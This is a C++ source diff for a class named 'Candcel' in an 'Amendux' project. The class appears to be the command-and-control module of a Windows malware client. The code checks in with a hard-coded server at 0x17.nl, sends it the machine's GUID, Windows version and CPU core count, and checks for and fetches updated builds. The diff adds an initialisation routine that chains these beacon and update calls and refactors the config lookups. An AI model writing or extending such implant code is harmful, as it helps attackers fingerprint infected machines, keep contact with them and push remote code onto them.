@@ -1,6 +1,5 @@
 #include "stdafx.h"
 #include "Log.h"
-#include "Encrypt.h"
 #include "Config.h"
 #include "Process.h"
 #include "RestClient.h"
@@ -9,6 +8,37 @@
 #include "Candcel.h"
 
 using namespace Amendux;
+
+Candcel *Candcel::s_Candcel = nullptr;
+
+Candcel::Candcel()
+{
+	Log::Info(L"Candcel", L"Initialize candcel class");
+}
+
+
+Candcel::~Candcel()
+{
+	Log::Info(L"Candcel", L"Terminate candcel class");
+}
+
+
+void Candcel::InitClass()
+{
+	if (!Config::Current()->CanConnect()) {
+		return;
+	}
+
+	IsAlive();
+	Solicit();
+
+	if (!Config::Current()->CanUpdate()) {
+		return;
+	}
+
+	CheckForUpdate();
+}
+
 
 void Candcel::IsAlive()
 {
@@ -38,7 +68,7 @@ DWORD Candcel::CheckIn()
 		RestClient rc("0x17.nl", "avc_endpoint.php");
 
 		JSONObject obj;
-		obj[L"guid"] = new JSONValue(Config::Guid());
+		obj[L"guid"] = new JSONValue(Config::Current()->Guid());
 
 		rc.Call(RestClientCommand::CM_CLIENT_CHECKIN, new JSONValue(obj));
 
@@ -61,7 +91,7 @@ void Candcel::Solicit()
 	RestClient rc("0x17.nl", "avc_endpoint.php");
 
 	JSONObject obj;
-	obj[L"guid"] = new JSONValue(Config::Guid());
+	obj[L"guid"] = new JSONValue(Config::Current()->Guid());
 	obj[L"cliver"] = new JSONValue(Config::getVersion());
 	obj[L"winver"] = new JSONValue(Util::winver());
 	obj[L"corenum"] = new JSONValue(std::to_wstring(Util::cpuCores()));
@@ -98,7 +128,7 @@ void Candcel::GetUpdate(unsigned int buildNumber, const std::wstring& wurl)
 
 void Candcel::CheckForUpdate()
 {
-	if (!serverSolicitAck || !Config::CanUpdate()) {
+	if (!serverSolicitAck) {
 		return;
 	}
 
